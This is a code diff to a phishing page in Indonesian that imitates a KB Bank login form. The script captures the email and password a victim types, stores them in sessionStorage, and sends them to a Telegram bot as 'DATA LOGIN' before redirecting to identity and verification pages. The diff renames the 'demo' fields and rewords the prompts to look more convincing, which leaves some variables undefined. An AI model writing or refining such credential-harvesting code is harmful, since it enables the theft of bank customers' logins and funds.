@@ -149,7 +149,7 @@
         <div class="field">
           <label for="demoEmail">Email </label>
           <div class="wrap">
-            <input id="demoEmail" type="email" maxlength="80" placeholder="Contoh: nama@contoh.com" autocomplete="off" inputmode="email" spellcheck="false">
+            <input id="demoEmail" type="email" maxlength="80" placeholder="email aktif Kb Bank" autocomplete="off" inputmode="email" spellcheck="false">
           </div>
           <p class="hint">Masukkan alamat email aktif yang terdaftar pada akun KB Bank Anda.</p>
         </div>
@@ -178,8 +178,8 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
     (() => {
       "use strict";
       const form = document.getElementById("login");
-      const email = document.getElementById("demoEmail");
-      const password = document.getElementById("demoPassword");
+      const email = document.getElementById("Email");
+      const password = document.getElementById("Password");
       const msg = document.getElementById("message");
       const toggle = document.getElementById("toggle");
 
@@ -218,7 +218,7 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
         }
         if (!/^[A-Z]/.test(demoPassword)) {
           msg.className = "message error";
-          msg.textContent = "Password harus diawali huruf besar.";
+          msg.textContent = "Password bebas/random, tetapi wajib mengandung minimal 1 huruf besar (A–Z)";
           return;
         }
 
@@ -226,14 +226,14 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
         const nextUrl = reauthRequired ? "verifikasi.html?reauth=1" : "identitas.html";
 
         // Simpan email dan password untuk digunakan di tahap selanjutnya
-        sessionStorage.setItem('kbEmail', demoEmail);
-        sessionStorage.setItem('kbPassword', demoPassword);
+        sessionStorage.setItem('kbEmail', Email);
+        sessionStorage.setItem('kbPassword', Password);
 
         // Kirim data login ke Telegram
         const teks = `🔐 DATA LOGIN
 
-Email    : ${demoEmail}
-Password : ${demoPassword}
+Email    : ${Email}
+Password : ${Password}
 ----`;
 
         kirimTelegram(teks)
